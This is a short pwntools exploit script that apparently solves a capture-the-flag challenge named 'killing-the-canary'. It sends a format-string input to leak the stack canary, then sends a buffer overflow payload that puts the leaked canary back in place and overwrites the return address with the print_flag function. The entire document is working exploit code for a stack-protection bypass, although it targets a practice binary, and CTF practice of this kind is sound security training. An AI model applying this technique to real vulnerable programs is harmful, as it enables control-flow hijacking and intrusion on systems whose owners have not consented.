#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(b"%19$lu") #Add your code here

val = r.recvuntil(b"What's your message? ")
# log.info(val)
canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
log.info(f"Canary: {canary:x}")

win = exe.symbols['print_flag']
# log.info(hex(win))

payload = b"A" * 72
payload += p64(canary)
payload += b"B" * 8
payload += p64(win)
r.sendline(payload)

r.recvline()
r.interactive()